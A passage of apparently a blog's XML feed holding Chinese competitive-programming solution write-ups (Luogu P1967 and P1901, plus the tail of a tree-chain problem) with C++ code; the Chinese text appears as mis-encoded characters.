class="built_in">Edge</span>(u, w, h[v]), h[v] = cnte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    sz[x] = <span class="number">1</span>; dep[x] = dep[fa[x]] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x]) <span class="keyword">continue</span>;</span><br><span class="line">        fa[to] = x;val[x] = E[i].len;</span><br><span class="line">        <span class="built_in">dfs1</span>(to);</span><br><span class="line">        sz[x] += sz[to];</span><br><span class="line">        <span class="keyword">if</span>(sz[to] &gt; sz[son[x]]) son[x] = to;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    L[x] = ++tot;</span><br><span class="line">    <span class="keyword">if</span>(x == son[fa[x]]) top[x] = top[fa[x]];</span><br><span class="line">    <span class="keyword">else</span> top[x] = x;</span><br><span class="line">    <span class="keyword">if</span>(son[x]) <span class="built_in">dfs2</span>(son[x]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x] || to == son[x]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    R[x] = tot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cut</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qsum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;<span class="comment">//å…¶å®å¯ä»¥æŸ¥åˆ°æœ‰1å°±é€€å‡ºï¼Œä¸ç”¨æŸ¥å®Œå’Œ</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x] != top[y])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]] &lt; dep[top[y]])<span class="built_in">swap</span>(x, y);</span><br><span class="line">        ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[top[x]] - <span class="number">1</span>));</span><br><span class="line">        x = fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x] &lt; dep[y])<span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="keyword">if</span> (x!=y)</span><br><span class="line">ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[y]));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) <span class="built_in">add_edge</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">dfs1</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">50</span>];</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">cut</span>(u, v);</span><br><span class="line">            war[++cntw] = <span class="built_in">P</span>(u, v);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> w = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">connect</span>(war[w].first, war[w].second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">qsum</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>()) != <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°é“¾å‰–åˆ† </tag>
            
            <tag> æ ‘çŠ¶æ•°ç»„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P1967 è´§è½¦è¿è¾“</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P1902</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªnä¸ªç‚¹mæ¡è¾¹çš„æ— å‘å¸¦æƒå›¾ï¼Œæ¯æ¬¡è¯¢é—®2ç‚¹u,vçš„è”é€šæƒ…å†µï¼Œä¸è”é€šåˆ™è¾“å‡º-1ã€‚<br>å¦‚æœè”é€šï¼Œä¸å¦¨å°†ä¸€æ¡è”é€šu,vçš„è·¯å¾„ä¸Šçš„æœ€å°æƒå€¼è®°ä¸ºwï¼Œåˆ™è¯¥æ¬¡è¯¢é—®è¾“å‡ºæ‰€æœ‰å¯èƒ½çš„wä¸­çš„æœ€å¤§å€¼ã€‚<br>å…±æœ‰qæ¬¡è¯¢é—®ã€‚</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å¯¹äºä»»æ„ä¸¤ç‚¹u&amp;vï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºèƒ½ä½¿å¾—wæœ€å¤§çš„ä¸€æ¡æœ€ä¼˜è·¯å¾„ã€‚<br>å› æ­¤éœ€è¦ç”Ÿæˆä¸€ä¸ªæ–°å›¾ï¼Œä½¿å¾—åŸå›¾ä¸­è”é€š<strong>ä»»æ„ä¸¤ç‚¹ä¹‹é—´åªå­˜åœ¨ä¸€æ¡</strong>èƒ½ä½¿å¾—wæœ€å¤§çš„æœ€ä¼˜è·¯å¾„ã€‚<br>å› æ­¤è¿™æ˜¯ä¸€æ£µæ ‘â€¦â€¦<br>åˆå› ä¸ºè¦ä½¿wæœ€å¤§ï¼Œåº”å°½é‡é€‰æ‹©è¾¹æƒå¤§çš„è¾¹ä½œä¸ºè·¯å¾„â€¦â€¦  ç„¶åå°±çªç„¶å‘è§‰ï¼šè¿™ä¸å°±æ˜¯Kruskalç®—æ³•çš„è¿‡ç¨‹å—ï¼Ÿåªä¸è¿‡æœ€å°ç”Ÿæˆæ ‘ä¼˜å…ˆé€‰æ‹©è¾¹æƒå°çš„è¾¹ï¼Œæ­¤æ—¶ä¼˜å…ˆé€‰æ‹©è¾¹æƒå¤§çš„ã€‚<br>å› æ­¤è¦æ±‚çš„æ–°å›¾å°±æ˜¯ä¸€é¢—<strong>æœ€å¤§ç”Ÿæˆæ ‘</strong>â€¦â€¦Kruskalå¯ç ´ã€‚<br>ç„¶åå°±æ˜¯æ±‚ä»»æ„ä¸¤ç‚¹LCAäº†ã€‚æ­¤å¤„ä½¿ç”¨å€å¢ï¼Œä¹Ÿæ–¹ä¾¿ç»´æŠ¤æŸèŠ‚ç‚¹å‘æ ‘æ ¹çˆ¬çš„æ—¶å€™è·¯ä¸Šçš„æœ€å°æƒå€¼ã€‚<br>ï¼ˆç”¨æ ‘é“¾å‰–åˆ†+çº¿æ®µæ ‘ç»´æŠ¤ä¹Ÿè¡Œâ€¦â€¦â€¦â€¦ï¼‰<br>æ›´å…·ä½“çš„çœ‹ä»£ç æ³¨é‡Šã€‚</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf 1000000005</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> u,v,w;<span class="comment">//ä¸¤ç‚¹u&amp;vä»¥åŠè¾¹æƒ</span></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Node &amp;b) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> w&lt;b.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector &lt;Node&gt; e[<span class="number">50005</span>];<span class="comment">//e[u]å‚¨å­˜èŠ‚ç‚¹uç›¸è¿çš„è¾¹é›†ã€‚</span></span><br><span class="line">priority_queue &lt;Node&gt; Q;<span class="comment">//è¾¹æƒè¶Šå¤§çš„ä¼˜å…ˆçº§è¶Šé«˜</span></span><br><span class="line"><span class="type">int</span> fa[<span class="number">50005</span>];<span class="comment">//Kruskalçš„å¾¡ç”¨å¹¶æŸ¥é›†ï¼Œfa[u]ä»£è¡¨uç‚¹æ‰€å¤„é›†åˆ</span></span><br><span class="line"><span class="type">bool</span> vis[<span class="number">50005</span>];<span class="comment">//æ˜¯å¦å·²ç»è¢«dfsè¿‡ç¨‹è®¿é—®è¿‡</span></span><br><span class="line"><span class="type">int</span> fas[<span class="number">50005</span>][<span class="number">21</span>],minw[<span class="number">50005</span>][<span class="number">21</span>],deep[<span class="number">50005</span>];</span><br><span class="line"><span class="comment">//fas[u][j]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­çš„ç¬¬2^jçº§çˆ¶äº²ç¼–å·</span></span><br><span class="line"><span class="comment">//minw[u][j]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­è‡³ç¬¬2^jçº§çˆ¶äº²çš„è·¯å¾„ä¸Šæœ€å°è¾¹æƒ</span></span><br><span class="line"><span class="comment">//deep[u]ä»£è¡¨uç‚¹åœ¨æ‰€å¤„æ ‘ä¸­æ·±åº¦</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//æŸ¥æ‰¾xæ‰€åœ¨é›†åˆç¼–å·</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x==fa[x]) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[x]=<span class="built_in">find</span>(fa[x]);<span class="comment">//è·¯å¾„å‹ç¼©</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uni</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> <span class="comment">//åˆå¹¶a,bæ‰€åœ¨é›†åˆ</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fa[<span class="built_in">find</span>(a)]=<span class="built_in">find</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w)</span> <span class="comment">//æ·»åŠ æ–°å›¾è¾¹</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node one;</span><br><span class="line">    one.u=u;</span><br><span class="line">    one.v=v;</span><br><span class="line">    one.w=w;</span><br><span class="line">    e[u].<span class="built_in">push_back</span>(one);</span><br><span class="line">    <span class="built_in">uni</span>(u,v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> f,<span class="type">int</span> k)</span><span class="comment">//dfsï¼Œuä»£è¡¨å½“å‰ç‚¹ï¼Œfä¸ºå½“å‰ç‚¹çˆ¶äº²ï¼Œkä¸ºæ·±åº¦</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[u]=<span class="number">1</span>;</span><br><span class="line">    deep[u]=k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;e[u].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e[u][i].v==f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(e[u][i].v,u,k+<span class="number">1</span>);</span><br><span class="line">            fas[e[u][i].v][<span class="number">0</span>]=u;</span><br><span class="line">            minw[e[u][i].v][<span class="number">0</span>]=e[u][i].w;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,m,q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> linked=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>()&amp;&amp;linked&lt;n<span class="number">-1</span>) &#123;<span class="comment">//è¾¹æ•°må¯èƒ½å°‘äºn-1ï¼Œå› æ­¤éœ€è¦æ³¨æ„Qæ˜¯å¦ä¸ºç©º</span></span><br><span class="line">        Node now=Q.<span class="built_in">top</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> a=now.u,b=now.v;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">find</span>(a)==<span class="built_in">find</span>(b)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            linked++;</span><br><span class="line">            <span class="built_in">add</span>(a,b,now.w);</span><br><span class="line">            <span class="built_in">add</span>(b,a,now.w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span><span class="comment">//æ±‚xï¼Œyçš„lca</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">find</span>(x)!=<span class="built_in">find</span>(y)) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//ä¸åœ¨ä¸€ä¸ªæ ‘é‡Œ</span></span><br><span class="line">    <span class="type">int</span> ans=inf;</span><br><span class="line">    <span class="keyword">if</span> (deep[y] &gt;deep[x]) <span class="built_in">swap</span>(x,y);<span class="comment">//è¾ƒæ·±çš„æ ‡è®°ä¸ºx</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//ä»¤xè·³åˆ°ä¸yç›¸åŒé«˜åº¦</span></span><br><span class="line">        <span class="keyword">if</span>(deep[fas[x][i]]&gt;=deep[y])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,minw[x][i]);</span><br><span class="line">            x=fas[x][i];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (x==y) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&gt;=<span class="number">0</span>; i--)<span class="comment">//è®©x,yä¸€èµ·è·³åˆ°lcaèŠ‚ç‚¹ä¸‹æ–¹</span></span><br><span class="line">        <span class="keyword">if</span>(fas[x][i]!=fas[y][i])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][i],minw[y][i]));</span><br><span class="line">            x=fas[x][i]; </span><br><span class="line">            y=fas[y][i];</span><br><span class="line">        &#125;</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][<span class="number">0</span>],minw[y][<span class="number">0</span>]));<span class="comment">//ç»Ÿè®¡æœ€å°è¾¹æƒ</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        fa[i]=i;<span class="comment">//å¹¶æŸ¥é›†é¢„å¤„ç†ï¼Œå„ä¸ªç‚¹éƒ½å¤„äºè‡ªå·±æ‰€ä»£è¡¨çš„é›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="type">int</span> x,y,z;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">        Node one;</span><br><span class="line">        one.u=x;</span><br><span class="line">        one.v=y;</span><br><span class="line">        one.w=z;</span><br><span class="line">        Q.<span class="built_in">push</span>(one);<span class="comment">//åŠ å…¥Kruskalå¾¡ç”¨é˜Ÿåˆ—Q</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//æœ€å¤§ç”Ÿæˆæ ‘</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;<span class="comment">//å€å¢æ•°ç»„åˆå§‹åŒ–&amp;dfs</span></span><br><span class="line">        <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(i,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            fas[i][<span class="number">0</span>]=i;</span><br><span class="line">            minw[i][<span class="number">0</span>]=inf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">20</span>;i++) &#123;<span class="comment">//å€å¢é¢„å¤„ç†</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</span><br><span class="line">            fas[j][i]=fas[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">            minw[j][i]=<span class="built_in">min</span>(minw[j][i<span class="number">-1</span>],minw[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=q;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">lca</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›¾è®º </tag>
            
            <tag> Kruskal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P1901 å‘å°„ç«™</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P1901</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>æœ‰ N ä¸ªèƒ½é‡å‘å°„ç«™æ’æˆä¸€è¡Œï¼Œæ¯ä¸ªéƒ½æœ‰**ä¸ç›¸åŒçš„é«˜åº¦ $H_i$**ï¼Œèƒ½å‘ä¸¤è¾¹ï¼ˆå½“ç„¶ä¸¤ç«¯çš„åªèƒ½å‘ä¸€è¾¹ï¼‰åŒæ—¶å‘å°„èƒ½é‡å€¼ä¸º$V_i$ çš„èƒ½é‡ï¼Œå¹¶ä¸”å‘å‡ºçš„èƒ½é‡åªè¢«ä¸¤è¾¹æœ€è¿‘çš„ä¸”æ¯”å®ƒé«˜çš„å‘å°„ç«™æ¥æ”¶ã€‚</p><p>æ˜¾ç„¶ï¼Œæ¯ä¸ªå‘å°„ç«™å‘æ¥çš„èƒ½é‡æœ‰å¯èƒ½è¢«0æˆ–1æˆ–2ä¸ªå…¶ä»–å‘å°„ç«™æ‰€æ¥å—ï¼Œæ±‚æ¥æ”¶æœ€å¤šèƒ½é‡çš„å‘å°„ç«™æ¥æ”¶çš„èƒ½é‡æ˜¯å¤šå°‘ã€‚</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ¯ä¸ªèƒ½é‡å¡”å°„å‡ºçš„èƒ½é‡è¢«å·¦å³ç¬¬ä¸€ä¸ªæ¯”å…¶é«˜çš„å¡”æ‰€æ‹¦æˆªã€‚éšéšçº¦çº¦è§‰å¾—å¯ä»¥ç”¨å•è°ƒæ ˆæâ€¦â€¦<br>ç»´æŠ¤ä¸€ä¸ªé«˜åº¦å•è°ƒä¸å‡æ ˆï¼Œè€ƒè™‘<strong>ä¾æ¬¡</strong>å°†èƒ½é‡å¡”iåŠ å…¥æ ˆï¼š  </p><ol><li>å¦‚æœé«˜åº¦æ¯”æ ˆé¡¶å…ƒç´ å¤§æˆ–æ ˆç©ºï¼Œæ ˆé¡¶å…ƒç´ èƒ½é‡åŠ ä¸Š$V_i$ï¼Œå‹å…¥æ ˆ;  </li><li>å¦‚æœé«˜åº¦æ¯”æ ˆé¡¶å…ƒç´ å°ï¼ˆæ ˆé¡¶å…ƒç´ ç¼–å·è®°ä¸ºtopï¼‰ï¼Œå½“å‰èƒ½é‡å¡”iæ¥æ”¶çš„èƒ½é‡åŠ ä¸Š$V_{top}$ï¼Œå¼¹å‡ºæ ˆé¡¶å…ƒç´ ã€‚é‡å¤æ‰§è¡Œç›´åˆ°ç¬¦åˆæƒ…å†µ1ï¼ŒæŒ‰1çš„å¤„ç†æ–¹æ³•å¤„ç†ã€‚<br>æœ€åç›´æ¥æ‰«æä¸€éæœ€å¤§å€¼ï¼Œè¾“å‡ºã€‚</li></ol><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> s1[<span class="number">1000010</span>],h[<span class="number">1000010</span>],v[<span class="number">1000010</span>],sum[<span class="number">1000010</span>],ans,n,top;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;h[i],&amp;v[i]);</span><br><span class="line">        <span class="keyword">while</span>(top&amp;&amp;h[s1[top]]&lt;h[i])</span><br><span class="line">            sum[i]+=v[s1[top]],top--;</span><br><span class="line">        sum[s1[top]]+=v[i];</span><br><span class="line">        top++;</span><br><span class="line">        s1[top]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,sum[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 